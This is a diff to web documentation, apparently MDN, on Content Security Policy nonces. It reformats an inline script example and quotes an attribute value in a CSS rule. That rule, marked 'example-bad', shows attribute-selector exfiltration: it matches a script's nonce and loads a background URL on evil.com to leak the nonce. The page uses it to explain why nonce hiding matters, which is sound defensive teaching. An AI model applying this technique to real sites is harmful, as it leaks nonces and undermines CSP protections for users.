@@ -45,7 +45,9 @@ crypto.randomBytes(16).toString('base64');
 The nonce generated on your backend code should now be used for the inline script that you'd like to allow-list:
 
 ```html
-<script nonce="8IBTHwOdqNKAWeKl7plt8g==">…</script>
+<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
+ // …
+</script>
 ```
 
 #### Sending a nonce with a CSP header
@@ -76,7 +78,7 @@ Nonce hiding helps prevent attackers from exfiltrating nonce data via mechanisms
 from content attributes like this:
 
 ```css example-bad
-script[nonce~=whatever] {
+script[nonce~="whatever"] {
   background: url("https://evil.com/nonce?whatever");
 }
 ```
